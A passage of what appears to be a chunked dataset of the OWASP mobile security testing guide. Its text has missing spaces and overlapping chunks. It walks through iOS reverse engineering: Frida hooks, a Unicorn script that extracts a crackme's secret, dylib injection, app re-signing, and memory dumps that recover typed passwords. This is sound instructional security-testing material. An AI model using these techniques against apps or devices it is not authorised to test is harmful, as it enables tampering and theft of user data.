//CreateanimmutableObjCstringobjectfromaJSstringobject. varstr_url=NSString.stringWithString_(myNSURL.toString()); //CalltheiOSNSLogfunctiontoprinttheURLtotheiOSdevicelogs NSLog(str_url); //UseFrida'sconsole.logtoprinttheURLtoyourterminal console.log(str_url); }finally{ pool.release(); } } }); \"\"\" 339\\nprocess =frida.get_usb_device().attach(\"Safari\") script =process.create_script(frida_code) script.load() sys.stdin.read() StartSafariontheiOSdevice. RuntheabovePythonscriptonyourconnectedhostandopenthedevicelog(asexplained inthesection“MonitoringSystemLogs”fromthechapter“iOSBasicSecurityTesting”). TryopeninganewURLinSafari, e.g.https://github.com/OWASP/owasp-mastg;youshouldseeFrida’soutputinthelogsaswellasinyourterminal. Of course, this example illustrates only one of the things you can do with Frida. To unlock the tool’s full potential, you should learn to use its JavaScript API. The documentation section of the Frida website has a tutorial and examples for usingFridaoniOS. Getting Loaded Classes and Methods dynamically Platform: ios IntheFridaREPLObjective-CruntimetheObjCcommandcanbeusedtoaccessinformationwithintherunningapp. Within theObjCcommandthefunctionenumerateLoadedClassesliststheloadedclassesforagivenapplication. $frida -U-fcom.iOweApp [iPhone::com.iOweApp]->ObjC.enumerateLoadedClasses() { \"/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation\":[ \"__NSBlockVariable__\", \"__NSGlobalBlock__\", \"__NSFinalizingBlock__\", \"__NSAutoBlock__\", \"__NSMallocBlock__\", \"__NSStackBlock__\" ], \"/private/var/containers/Bundle/Application/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp\":[ \"JailbreakDetection\", \"CriticalLogic\", \"ViewController\", \"AppDelegate\" ] } UsingObjC.classes.<classname>.$ownMethodsthemethodsdeclaredineachclasscanbelisted. [iPhone::com.iOweApp]->ObjC.classes.JailbreakDetection.$ownMethods [ \"+isJailbroken\" ] [iPhone::com.iOweApp]->ObjC.classes.CriticalLogic.$ownMethods [ \"+doSha256:\", \"-a:\", \"-AES128Operation:data:key:iv:\", 340\\n\"-coreLogic\", \"-bat\", \"-b:\", \"-hexString:\" ] Sandbox Inspection Platform: ios On iOS, each application gets a sandboxed folder to store its data. As per the iOS security model, an application’s sandboxed folder cannot be accessed by another application. Additionally, the users do not have direct access to the iOSfilesystem,thuspreventingbrowsingorextractionofdatafromthefilesystem. IniOS<8.3therewereapplications availablewhichcanbeusedtobrowsethedevice’sfilesystem,suchasiExplorerandiFunBox,butintherecentversionof iOS(>8.3)thesandboxingrulesaremorestringentandtheseapplicationsdonotworkanymore. Asaresult,ifyouneed toaccessthefilesystemitcanonlybeaccessedonajailbrokendevice. Aspartofthejailbreakingprocess,theapplication sandboxprotectionisdisabledandthusenablinganeasyaccesstosandboxedfolders. Thecontentsofanapplication’ssandboxedfolderhasalreadybeendiscussedin“AccessingAppDataDirectories”inthe chapteriOSBasicSecurityTesting. Thischaptergivesanoverviewofthefolderstructureandwhichdirectoriesyoushould analyze. Information Gathering - API Usage Platform: ios TheiOSplatformprovidesmanybuilt-inlibrariesforfrequentlyusedfunctionalitiesinapplications,forexamplecryptog- raphy,Bluetooth,NFC,networkandlocationlibraries. Determiningthepresenceoftheselibrariesinanapplicationcan giveusvaluableinformationaboutitsunderlyingworking. For instance, if an application is importing the CC_SHA256 function, it indicates that the application will be performing somekindofhashingoperationusingtheSHA256algorithm. FurtherinformationonhowtoanalyzeiOS’scryptographic APIsisdiscussedinthesection“iOSCryptographicAPIs”. Similarly,theaboveapproachcanbeusedtodeterminewhereandhowanapplicationisusingBluetooth. Forinstance,an applicationperformingcommunicationusingtheBluetoothchannelmustusefunctionsfromtheCoreBluetoothframework suchasCBCentralManagerorconnect. UsingtheiOSBluetoothdocumentationyoucandeterminethecriticalfunctions andstartanalysisaroundthosefunctionimports. Emulation-based Analysis Platform: ios iOS Simulator Apple provides a simulator app within Xcode which provides a real iOS device looking user interface for iPhone, iPad or Apple Watch. It allows you to rapidly prototype and test debug builds of your applications during the development process,butactuallyitisnotanemulator. Differencebetweenasimulatorandanemulatorispreviouslydiscussedin “Emulation-basedDynamicAnalysis”section. Whiledevelopinganddebugginganapplication,theXcodetoolchaingeneratesx86code,whichcanbeexecutedinthe iOS simulator. However, for a release build, only ARM code is generated (incompatible with the iOS simulator). That’s why applications downloaded from the Apple App Store cannot be used for any kind of application analysis",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 123
    }
  },
  {
    "text": "prototype and test debug builds of your applications during the development process,butactuallyitisnotanemulator. Differencebetweenasimulatorandanemulatorispreviouslydiscussedin “Emulation-basedDynamicAnalysis”section. Whiledevelopinganddebugginganapplication,theXcodetoolchaingeneratesx86code,whichcanbeexecutedinthe iOS simulator. However, for a release build, only ARM code is generated (incompatible with the iOS simulator). That’s why applications downloaded from the Apple App Store cannot be used for any kind of application analysis on the iOS simulator. 341\\nCorellium CorelliumisacommercialtoolwhichoffersvirtualiOSdevicesrunningactualiOSfirmware,beingtheonlypubliclyavail- able iOS emulator ever. Since it is a proprietary product, not much information is available about the implementation. Corelliumhasnocommunitylicensesavailable,thereforewewon’tgointomuchdetailregardingitsuse. Corellium allows you to launch multiple instances of a device (jailbroken or not) which are accessible as local devices (withasimpleVPNconfiguration). Ithastheabilitytotakeandrestoresnapshotsofthedevicestate,andalsooffersa convenientweb-basedshelltothedevice. Finallyandmostimportantly,duetoits“emulator”nature,youcanexecute applicationsdownloadedfromtheAppleAppStore,enablinganykindofapplicationanalysisasyouknowitfromrealiOS (jailbroken)devices. NotethatinordertoinstallanIPAonCorelliumdevicesithastobeunencryptedandsignedwithavalidAppledeveloper certificate. Seemoreinformationhere. Unicorn Unicornisalightweight,multi-architectureCPUemulatorframeworkbasedonQEMUandgoesbeyonditbyaddinguseful features especially made for CPU emulation. Unicorn provides the basic infrastructure needed to execute processor instructions. InthissectionwewilluseUnicorn’sPythonbindingstosolvetheUnCrackableAppforiOSLevel1challenge. TouseUnicorn’sfullpower,wewouldneedtoimplementallthenecessaryinfrastructurewhichgenerallyisreadilyavail- ablefromtheoperatingsystem,e.g.binaryloader,linkerandotherdependenciesoruseanotherhigherlevelframeworks such as Qiling which leverages Unicorn to emulate CPU instructions, but understands the OS context. However, this is superfluousforthisverylocalizedchallengewhereonlyexecutingasmallpartofthebinarywillsuffice. Whileperformingmanualanalysisin“ReviewingDisassembledNativeCode”section,wedeterminedthatthefunctionat address0x1000080d4isresponsiblefordynamicallygeneratingthesecretstring. Aswe’reabouttosee,allthenecessary codeisprettymuchself-containedinthebinary,makingthisaperfectscenariotouseaCPUemulatorlikeUnicorn. 342\\nIfweanalyzethatfunctionandthesubsequentfunctioncalls,wewillobservethatthereisnoharddependencyonany externallibraryandneitherit’sperforminganysystemcalls. Theonlyaccessexternaltothefunctionsoccursforinstance ataddress0x1000080f4,whereavalueisbeingstoredtoaddress0x10000dbf0,whichmapstothe__datasection. Therefore, in order to correctly emulate this section of the code, apart from the __text section (which contains the instructions)wealsoneedtoloadthe__datasection. TosolvethechallengeusingUnicornwewillperformthefollowingsteps: • Get the ARM64 version of the binary by running lipo -thin arm64 <app_binary> -output uncrackable.arm64 (ARMv7canbeusedaswell). • Extractthe__textand__datasectionfromthebinary. • Createandmapthememorytobeusedasstackmemory. • Creatememoryandloadthe__textand__datasection. • Executethebinarybyprovidingthestartandendaddress. • Finally,dumpthereturnvaluefromthefunction,whichinthiscaseisoursecretstring. To extract the content of __text and __data section from the Mach-O binary we will useLIEF, which provides a conve- nientabstractiontomanipulatemultipleexecutablefileformats. Beforeloadingthesesectionstomemory,weneedto determinetheirbaseaddresses,e.g.byusingGhidra,Radare2orIDAPro. 343\\nFromtheabovetable,wewillusethebaseaddress0x10000432cfor__textand0x10000d3e8for__datasectiontoload thematinthememory. WhileallocatingmemoryforUnicorn,thememoryaddressesshouldbe4kpagealignedandalsotheallocatedsize shouldbeamultipleof1024. Thefollowingscriptemulatesthefunctionat0x1000080d4anddumpsthesecretstring: importlief fromunicornimport * fromunicorn.arm64_constimport * ##---Extract__textand__datasectioncontentfromthebinary--- binary =lief.parse(\"uncrackable.arm64\") text_section =binary.get_section(\"__text\") text_content =text_section.content data_section =binary.get_section(\"__data\") data_content =data_section.content ##---SetupUnicornforARM64execution--- arch =\"arm64le\" emu=Uc(UC_ARCH_ARM64,UC_MODE_ARM) ##---CreateStackmemory--- addr =0x40000000 size =1024*1024 emu.mem_map(addr,size) emu.reg_write(UC_ARM64_REG_SP,addr +size -1) ##---Loadtextsection-- base_addr =0x100000000 tmp_len =1024*1024 text_section_load_addr =0x10000432c emu.mem_map(base_addr,tmp_len) emu.mem_write(text_section_load_addr,bytes(text_content)) ##---Loaddatasection--- data_section_load_addr =0x10000d3e8 emu.mem_write(data_section_load_addr,bytes(data_content)) ##---Hackforstack_chk_guard--- ##withoutthiswillthrowinvalidmemoryreadat0x0 emu.mem_map(0x0,1024) emu.mem_write(0x0,b\"00\") ##---Executefrom0x1000080d4to0x100008154--- 344\\nemu.emu_start(0x1000080d4,0x100008154) ret_value =emu.reg_read(UC_ARM64_REG_X0) ##---Dumpreturnvalue--- print(emu.mem_read(ret_value, 11)) Youmaynoticethatthereisanadditionalmemoryallocationataddress0x0,thisisasimplehackaroundstack_- chk_guardcheck. Withoutthis,therewillbeainvalidmemoryreaderrorandbinarycannotbeexecuted. Withthis hack,theprogramwillaccessthevalueat0x0anduseitforthestack_chk_guardcheck. Tosummarize,usingUnicorndorequiresomeadditionalsetupbeforeexecutingthebinary,butoncedone,thistoolcan help to provide deep insights into the binary. It provides the flexibility to execute the full binary or a limited part of it. UnicornalsoexposesAPIstoattachhookstotheexecution. Usingthesehooksyoucanobservethestateoftheprogram atanypointduringtheexecutionorevenmanipulatetheregisterorvariablevaluesandforcefullyexploreotherexecution branchesinaprogram. AnotheradvantagewhenrunningabinaryinUnicornisthatyoudon’tneedtoworryaboutvarious checkslikeroot/jailbreakdetectionordebuggerdetectionetc. Monitoring System Logs Platform: ios Manyappsloginformative(andpotentiallysensitive)messagestotheconsolelog. Thelogalsocontainscrashreports andotherusefulinformation. YoucancollectconsolelogsthroughtheXcodeDeviceswindowasfollows: 1. LaunchXcode. 2. Connectyourdevicetoyourhostcomputer. 3. ChooseWindow->DevicesandSimulators. 4. ClickonyourconnectediOSdeviceintheleftsectionoftheDeviceswindow. 5. Reproducetheproblem. 6. ClickontheOpenConsolebuttonlocatedintheupperright-handareaoftheDeviceswindowtoviewtheconsole logsonaseparatewindow. Tosavetheconsoleoutputtoatextfile,gotothetoprightsideoftheConsolewindowandclickontheSavebutton. 345\\nYoucanalsoconnecttothedeviceshellasexplainedinAccessingtheDeviceShell,installsocatviaapt-getandrunthe followingcommand: iPhone:~root#socat -UNIX-CONNECT:/var/run/lockdown/syslog.sock ======================== ASLisheretoserveyou >watch OK Jun 713:42:14iPhonechmod[9705]<Notice>:MS:Notice:Injecting: (null)[chmod] (1556.00) Jun 713:42:14iPhonereadlink[9706]<Notice>:MS:Notice:Injecting: (null) [readlink] (1556.00) Jun 713:42:14iPhonerm[9707]<Notice>:MS:Notice:Injecting: (null)[rm] (1556.00) Jun 713:42:14iPhonetouch[9708]<Notice>:MS:Notice:Injecting: (null)[touch] (1556.00) ... Repackaging Apps Platform: ios Ifyouneedtotestonanon-jailbrokendeviceyoushouldlearnhowtorepackageanapptoenabledynamictestingon it. UseacomputerwithmacOStoperformallthestepsindicatedinthearticle“PatchingiOSApplications”fromtheobjection Wiki. Onceyou’redoneyou’llbeabletopatchanIPAbycallingtheobjectioncommand: objectionpatchipa --source my-app.ipa --codesign-signature 0C2E8200Dxxxx Finally, the app needs to be installed (sideloaded) and run with debugging communication enabled. Perform the steps fromthearticle“RunningPatchediOSApplications”fromtheobjectionWiki(usingios-deploy). ios-deploy --bundle Payload/my-app.app -W-d Referto“InstallingApps”tolearnaboutotherinstallationmethods. Someofthemdoesn’trequireyoutohaveamacOS. Thisrepackagingmethodisenoughformostusecases. Formoreadvancedrepackaging,referto“iOSTampering andReverseEngineering-Patching,RepackagingandRe-Signing”. 346\\nLibrary Injection Platform: ios IfyouwanttouseFridaonnon-jailbrokendevicesyou’llneedtoincludeFridaGadget.dylib. Downloaditfirst: curl -Ohttps://build.frida.re/frida/ios/lib/FridaGadget.dylib Copy FridaGadget.dylib into the app directory and use optool to add a load command to the “UnCrackable Level 1” binary. $unzipUnCrackable-Level1.ipa $cpFridaGadget.dylibPayload/UnCrackable\\Level\\1.app/ $optoolinstall -cload -p\"@executable_path/FridaGadget.dylib\" -tPayload/UnCrackable\\Level\\1.app/UnCrackable\\Level\\1 FoundFATHeader Foundthinheader... Foundthinheader... InsertingaLC_LOAD_DYLIBcommandforarchitecture:arm SuccessfullyinsertedaLC_LOAD_DYLIBcommandforarm InsertingaLC_LOAD_DYLIBcommandforarchitecture:arm64 SuccessfullyinsertedaLC_LOAD_DYLIBcommandforarm64 WritingexecutabletoPayload/UnCrackableLevel1.app/UnCrackableLevel1... Patching Example: Making an App Debuggable Bydefault,anappavailableontheAppleAppStoreisnotdebuggable. InordertodebuganiOSapplication,itmusthave theget-task-allowentitlementenabled. Thisentitlementallowsotherprocesses(likeadebugger)toattachtotheapp. Xcodeisnotaddingtheget-task-allowentitlementinadistributionprovisioningprofile;itisonlywhitelistedandadded inadevelopmentprovisioningprofile. Thus,todebuganiOSapplicationobtainedfromtheAppStore,itneedstobere-signedwithadevelopmentprovisioning profilewiththeget-task-allowentitlement. Howtore-signanapplicationisdiscussedinthenextsection. Process Exploration Platform: ios Whentestinganapp,processexplorationcanprovidethetesterwithdeepinsightsintotheappprocessmemory. Itcan beachievedviaruntimeinstrumentationandallowstoperformtaskssuchas: • Retrievingthememorymapandloadedlibraries. • Searchingforoccurrencesofcertaindata. • Afterdoingasearch,obtainingthelocationofacertainoffsetinthememorymap. • Performingamemorydumpandinspectorreverseengineerthebinarydataoffline. • ReverseengineeringabinaryorFrameworkwhileit’srunning. As you can see, these tasks are rather supportive and/or passive, they’ll help us collect data and information that will supportothertechniques.",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 124
    }
  },
  {
    "text": "an App Debuggable Bydefault,anappavailableontheAppleAppStoreisnotdebuggable. InordertodebuganiOSapplication,itmusthave theget-task-allowentitlementenabled. Thisentitlementallowsotherprocesses(likeadebugger)toattachtotheapp. Xcodeisnotaddingtheget-task-allowentitlementinadistributionprovisioningprofile;itisonlywhitelistedandadded inadevelopmentprovisioningprofile. Thus,todebuganiOSapplicationobtainedfromtheAppStore,itneedstobere-signedwithadevelopmentprovisioning profilewiththeget-task-allowentitlement. Howtore-signanapplicationisdiscussedinthenextsection. Process Exploration Platform: ios Whentestinganapp,processexplorationcanprovidethetesterwithdeepinsightsintotheappprocessmemory. Itcan beachievedviaruntimeinstrumentationandallowstoperformtaskssuchas: • Retrievingthememorymapandloadedlibraries. • Searchingforoccurrencesofcertaindata. • Afterdoingasearch,obtainingthelocationofacertainoffsetinthememorymap. • Performingamemorydumpandinspectorreverseengineerthebinarydataoffline. • ReverseengineeringabinaryorFrameworkwhileit’srunning. As you can see, these tasks are rather supportive and/or passive, they’ll help us collect data and information that will supportothertechniques. Therefore,they’renormallyusedincombinationwithothertechniquessuchasmethodhook- ing. In the following sections you will be using r2frida to retrieve information straight from the app runtime. First start by openinganr2fridasessiontothetargetapp(e.g.iGoat-Swift)thatshouldberunningonyouriPhone(connectedperUSB). Usethefollowingcommand: r2frida://usb//iGoat-Swift Memory Maps and Inspection Youcanretrievetheapp’smemorymapsbyrunning:dm: 347\\n[0x00000000]>:dm 0x0000000100b7c000 -0x0000000100de0000r-x/private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app/iGoat-Swift 0x0000000100de0000 -0x0000000100e68000rw-/private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app/iGoat-Swift 0x0000000100e68000 -0x0000000100e97000r--/private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app/iGoat-Swift ... 0x0000000100ea8000 -0x0000000100eb0000rw- 0x0000000100eb0000 -0x0000000100eb4000r-- 0x0000000100eb4000 -0x0000000100eb8000r-x/usr/lib/TweakInject.dylib 0x0000000100eb8000 -0x0000000100ebc000rw-/usr/lib/TweakInject.dylib 0x0000000100ebc000 -0x0000000100ec0000r--/usr/lib/TweakInject.dylib 0x0000000100f60000 -0x00000001012dc000r-x ↪ /private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app/Frameworks/Realm.framework/Realm While you’re searching or exploring the app memory, you can always verify where your current offset is located in the memorymap. Insteadofnotingandsearchingforthememoryaddressinthislistyoucansimplyrun:dm.. You’llfindan exampleinthefollowingsection“In-MemorySearch”. Ifyou’reonlyinterestedintothemodules(binariesandlibraries)thattheapphasloaded,youcanusethecommand:il tolistthemall: [0x00000000]>:il 0x0000000100b7c000iGoat-Swift 0x0000000100eb4000TweakInject.dylib 0x00000001862c0000SystemConfiguration 0x00000001847c0000libc++.1.dylib 0x0000000185ed9000Foundation 0x000000018483c000libobjc.A.dylib 0x00000001847be000libSystem.B.dylib 0x0000000185b77000CFNetwork 0x0000000187d64000CoreData 0x00000001854b4000CoreFoundation 0x00000001861d3000Security 0x000000018ea1d000UIKit 0x0000000100f60000Realm Asyoumightexpectyoucancorrelatetheaddressesofthelibrarieswiththememorymaps: e.g.themainappbinary iGoat-Swiftislocatedat0x0000000100b7c000andtheRealmFrameworkat0x0000000100f60000. Youcanalsouseobjectiontodisplaythesameinformation. $objection --gadget OWASP.iGoat-Swiftexplore OWASP.iGoat-Swifton (iPhone:11.1.2)[usb] #memorylistmodules Savetheoutputbyadding `--jsonmodules.json`tothiscommand Name Base Size Path -------------------------------- ----------- -------------------- ------------------------------------------------------------------------------ iGoat-Swift 0x100b7c000 2506752 (2.4MiB) /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGo... TweakInject.dylib 0x100eb4000 16384 (16.0KiB) /usr/lib/TweakInject.dylib SystemConfiguration 0x1862c0000 446464 (436.0KiB) /System/Library/Frameworks/SystemConfiguration.framework/SystemConfiguratio... libc++.1.dylib 0x1847c0000 368640 (360.0KiB) /usr/lib/libc++.1.dylib In-Memory Search In-memorysearchisaveryusefultechniquetotestforsensitivedatathatmightbepresentintheappmemory. See r2frida’s help on the search command (\\/?) to learn about the search command and get a list of options. The followingshowsonlyasubsetofthem: [0x00000000]>\\/? / search /j searchjson /w searchwide /wj searchwidejson /x searchhex /xj searchhexjson ... Youcanadjustyoursearchbyusingthesearchsettings\\e~search. Forexample,\\e search.quiet=true;willprintonly theresultsandhidesearchprogress: 348\\n[0x00000000]>\\e~search esearch.in=perm:r-- esearch.quiet=false Fornow,we’llcontinuewiththedefaultsandconcentrateonstringsearch. Inthisfirstexample,youcanstartbysearching forsomethingthatyouknowshouldbelocatedinthemainbinaryoftheapp: [0x00000000]>\\/iGoat Searching5bytes:69476f6174 Searching5bytesin [0x0000000100b7c000-0x0000000100de0000] ... hits:509 0x100d7d332hit2_0iGoat_Swift24StringAnalysisExerciseVCC 0x100d7d3b2hit2_1iGoat_Swift28BrokenCryptographyExerciseVCC 0x100d7d442hit2_2iGoat_Swift23BackgroundingExerciseVCC 0x100d7d4b2hit2_3iGoat_Swift9AboutCellC 0x100d7d522hit2_4iGoat_Swift12FadeAnimatorV Nowtakethefirsthit,seektoitandcheckyourcurrentlocationinthememorymap: [0x00000000]>s0x100d7d332 [0x100d7d332]>:dm. 0x0000000100b7c000 -0x0000000100de0000r-x/private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app/iGoat-Swift Asexpected,youarelocatedintheregionofthemainiGoat-Swiftbinary(r-x,readandexecute). Intheprevioussection, yousawthatthemainbinaryislocatedbetween0x0000000100b7c000and0x0000000100e97000. Now,forthissecondexample,youcansearchforsomethingthat’snotintheappbinarynorinanyloadedlibrary,typically userinput. OpentheiGoat-SwiftappandnavigateinthemenutoAuthentication->RemoteAuthentication->Start. Thereyou’llfindapasswordfieldthatyoucanoverwrite. Writethestring“owasp-mstg”butdonotclickonLoginjust yet. Performthefollowingtwosteps. [0x00000000]>\\/owasp-mstg hits:1 0x1c06619c0hit3_0owasp-mstg Infact,thestringcouldbefoundataddress0x1c06619c0. Seekstothereandretrievethecurrentmemoryregionwith :dm.. [0x100d7d332]>s0x1c06619c0 [0x1c06619c0]>:dm. 0x00000001c0000000 -0x00000001c8000000rw- Nowyouknowthatthestringislocatedinarw-(readandwrite)regionofthememorymap. Additionally, you can search for occurrences of the wide version of the string (/w) and, again, check their memory re- gions: Thistimewerunthe\\dm. commandforall@@hitsmatchingtheglobhit5_*. [0x00000000]>/wowasp-mstg Searching20bytes:6f0077006100730070002d006d00730074 006700 Searching20bytesin [0x0000000100708000-0x000000010096c000] ... hits:2 0x1020d1280hit5_06f0077006100730070002d006d00730074006700 0x1030c9c85hit5_16f0077006100730070002d006d00730074006700 [0x00000000]>\\dm.@@hit5_* 0x0000000102000000 -0x0000000102100000rw- 0x0000000103084000 -0x00000001030cc000rw- Theyareinadifferentrw-region. Notethatsearchingforthewideversionsofstringsissometimestheonlywaytofind themasyou’llseeinthefollowingsection. In-memorysearchcan be very useful to quickly know ifcertain data is located in the main app binary, inside a shared libraryorinanotherregion. Youmayalsouseittotestthebehavioroftheappregardinghowthedataiskeptinmemory. Forinstance,youcouldcontinuethepreviousexample,thistimeclickingonLoginandsearchingagainforoccurrences ofthedata. Also,youmaycheckifyoustillcanfindthosestringsinmemoryaftertheloginiscompletedtoverifyifthis sensitivedataiswipedfrommemoryafteritsuse. 349\\nMemory Dump Youcandumptheapp’sprocessmemorywithobjectionandFridump. Totakeadvantageofthesetoolsonanon-jailbroken device,theAndroidappmustberepackagedwithfrida-gadget.soandre-signed. Adetailedexplanationofthisprocess is in the section “Dynamic Analysis on Non-Jailbroken Devices. To use these tools on a jailbroken phone, simply have frida-serverinstalledandrunning. Withobjectionitispossibletodumpallmemoryoftherunningprocessonthedevicebyusingthecommandmemorydump all. $objectionexplore iPhoneon (iPhone:10.3.1)[usb] #memorydumpall/Users/foo/memory_iOS/memory Dumping768.0KiBfrombase:0x1ad200000 [####################################] 100% Memorydumpedtofile:/Users/foo/memory_iOS/memory Alternatively you can use Fridump. First, you need the name of the app you want to dump, which you can get with frida-ps. $frida-ps -U PID Name ---- ------ 1026 Gadget Afterwards,specifytheappnameinFridump. $python3fridump.py -uGadget -s CurrentDirectory:/Users/foo/PentestTools/iOS/fridump Outputdirectoryissetto:/Users/foo/PentestTools/iOS/fridump/dump Creatingdirectory... StartingMemorydump... Progress: [##################################################]100.0%Complete Runningstringsonallfiles: Progress: [##################################################]100.0%Complete Finished!PressCtrl+C Whenyouaddthe-sflag,allstringsareextractedfromthedumpedrawmemoryfilesandaddedtothefilestrings.txt, whichisstoredinFridump’sdumpdirectory. Inbothcases,ifyouopenthefileinradare2youcanuseitssearchcommand(/). Notethatfirstwedoastandardstring searchwhichdoesn’tsucceedandnextwesearchforawidestring,whichsuccessfullyfindsourstring“owasp-mstg”. $r2memory_ios [0x00000000]>/owasp-mstg Searching10bytesin [0x0-0x628c000] hits:0 [0x00000000]>/wowasp-mstg Searching20bytesin [0x0-0x628c000] hits:1 0x0036f800hit4_06f0077006100730070002d006d00730074006700 Next,wecanseektoitsaddressusings0x0036f800orshit4_0andprintitusingpsw(whichstandsforprintstringwide) orusepxtoprintitsrawhexadecimalvalues: [0x0036f800]>psw owasp-mstg [0x0036f800]>px48 -offset - 01 23 45 67 89 AB CD EF 0123456789ABCDEF 0x0036f800 6f0077006100730070002d006d007300 o.w.a.s.p.-.m.s. 0x0036f810 74006700000000000000000000000000 t.g............. 0x0036f820 00000000000000000000000000000000 ................ Notethatinordertofindthisstringusingthestringscommandyou’llhavetospecifyanencodingusingthe-eflagand inthiscaselfor16-bitlittle-endiancharacter. 350\\n$strings -elmemory_ios |grep owasp-mstg owasp-mstg Waiting for the debugger Platform: ios TODO:Shouldbepossiblewithlldbaswell,currentlydon’thaveanything. Get Loaded Native Libraries Platform: ios Using Objection Youcanusethelist_frameworkscommandinobjectiontolistalltheapplication’sbundlesthatrepresentFrameworks. ...itudehacks.DVIAswiftv2.developon (iPhone:13.2.3)[usb] #iosbundleslist_frameworks Executable Bundle Version Path -------------- ----------------------------------------- --------- ------------------------------------------- Bolts org.cocoapods.Bolts 1.9.0 ...8/DVIA-v2.app/Frameworks/Bolts.framework RealmSwift org.cocoapods.RealmSwift 4.1.1 ...A-v2.app/Frameworks/RealmSwift.framework ...ystem/Library/Frameworks/IOKit.framework ... Using Frida",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 125
    }
  },
  {
    "text": "t.g............. 0x0036f820 00000000000000000000000000000000 ................ Notethatinordertofindthisstringusingthestringscommandyou’llhavetospecifyanencodingusingthe-eflagand inthiscaselfor16-bitlittle-endiancharacter. 350\\n$strings -elmemory_ios |grep owasp-mstg owasp-mstg Waiting for the debugger Platform: ios TODO:Shouldbepossiblewithlldbaswell,currentlydon’thaveanything. Get Loaded Native Libraries Platform: ios Using Objection Youcanusethelist_frameworkscommandinobjectiontolistalltheapplication’sbundlesthatrepresentFrameworks. ...itudehacks.DVIAswiftv2.developon (iPhone:13.2.3)[usb] #iosbundleslist_frameworks Executable Bundle Version Path -------------- ----------------------------------------- --------- ------------------------------------------- Bolts org.cocoapods.Bolts 1.9.0 ...8/DVIA-v2.app/Frameworks/Bolts.framework RealmSwift org.cocoapods.RealmSwift 4.1.1 ...A-v2.app/Frameworks/RealmSwift.framework ...ystem/Library/Frameworks/IOKit.framework ... Using Frida InFridaREPLprocessrelatedinformationcanbeobtainedusingtheProcesscommand. WithintheProcesscommand thefunctionenumerateModulesliststhelibrariesloadedintotheprocessmemory. [iPhone::com.iOweApp]->Process.enumerateModules() [ { \"base\":\"0x10008c000\", \"name\": \"iOweApp\", \"path\":\"/private/var/containers/Bundle/Application/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp\", \"size\":49152 }, { \"base\":\"0x1a1c82000\", \"name\":\"Foundation\", \"path\":\"/System/Library/Frameworks/Foundation.framework/Foundation\", \"size\":2859008 }, { \"base\":\"0x1a16f4000\", \"name\":\"libobjc.A.dylib\", \"path\":\"/usr/lib/libobjc.A.dylib\", \"size\":200704 }, ... Similarly,informationrelatedtovariousthreadscanbeobtained. Process.enumerateThreads() [ { \"context\":{ ... }, \"id\": 1287, \"state\":\"waiting\" }, ... TheProcesscommandexposesmultiplefunctionswhichcanbeexploredasperneeds. Someusefulfunctionsarefind- ModuleByAddress,findModuleByNameandenumerateRangesbesidesothers. 351\\nAutomated Static Analysis Platform: ios Several automated tools for analyzing iOS apps are available; most of them are commercial tools. The free and open sourcetoolsMobSFandobjectionhavesomestaticanddynamicanalysisfunctionality. Additionaltoolsarelistedinthe “StaticSourceCodeAnalysis”sectionofthe“TestingTools”chapter. Don’t shy away from using automated scanners for your analysis - they help you pick low-hanging fruit and allow you tofocusonthemoreinterestingaspectsofanalysis,suchasthebusinesslogic. Keepinmindthatstaticanalyzersmay producefalsepositivesandfalsenegatives;alwaysreviewthefindingscarefully. Repackaging and Re-Signing Platform: ios Of course, tampering an app invalidates the main executable’s code signature, so this won’t run on a non-jailbroken device. You’ll need to replace the provisioning profile and sign both the main executable and the files you’ve made include(e.g.FridaGadget.dylib)withthecertificatelistedintheprofile. Repackaging First,let’saddourownprovisioningprofiletothepackage: cpAwesomeRepackaging.mobileprovisionPayload/UnCrackable\\Level\\1.app/embedded.mobileprovision Next, we need to make sure that the Bundle ID in Info.plist matches the one specified in the profile because the codesigntoolwillreadtheBundleIDfromInfo.plistduringsigning;thewrongvaluewillleadtoaninvalidsignature. /usr/libexec/PlistBuddy -c\"Set:CFBundleIdentifiersg.vantagepoint.repackage\" Payload/UnCrackable\\Level\\ 1.app/Info.plist Re-Signing Finally, we use the codesign tool to re-sign both binaries. You need to use your own signing identity (in this example 8004380F331DCA22CC1B47FB1A805890AE41C938),whichyoucanoutputbyexecutingthecommandsecurity find- identity -v. $rm -rfPayload/UnCrackable\\Level\\1.app/_CodeSignature $/usr/bin/codesign --force --sign 8004380F331DCA22CC1B47FB1A805890AE41C938 Payload/UnCrackable\\Level\\1.app/FridaGadget.dylib Payload/UnCrackableLevel1.app/FridaGadget.dylib:replacingexistingsignature entitlements.plististhefileyoucreatedforyouremptyiOSproject. $/usr/bin/codesign --force --sign 8004380F331DCA22CC1B47FB1A805890AE41C938 --entitlements entitlements.plistPayload/UnCrackable\\ Level\\1.app/UnCrackable\\ ↪ Level\\1 Payload/UnCrackableLevel1.app/UnCrackableLevel1:replacingexistingsignature Nowyoushouldbereadytorunthemodifiedapp. Deployandruntheapponthedeviceusingios-deploy: ios-deploy --debug --bundle Payload/UnCrackable\\Level\\1.app/ Ifeverythingwentwell,theappshouldstartindebuggingmodewithLLDBattached. Fridashouldthenbeabletoattach totheappaswell. Youcanverifythisviathefrida-pscommand: 352\\n$frida-ps -U PID Name --- ------ 499 Gadget Whensomethinggoeswrong(anditusuallydoes),mismatchesbetweentheprovisioningprofileandcode-signingheader arethemostlikelycauses. Readingtheofficialdocumentationhelpsyouunderstandthecode-signingprocess. Apple’s entitlementtroubleshootingpageisalsoausefulresource. Decompiling Native Code Platform: ios TODO.Hopperisonlymentionedonceintheentiredocument,ghidraisonlyusedfordisassembly,...Wecanexpandthis, maybeaddsomegoodghidrasnippetsforobjective-cmapping,... Information Gathering - Network Communication Platform: ios Most of the apps you might encounter connect to remote endpoints. Even before you perform any dynamic analysis 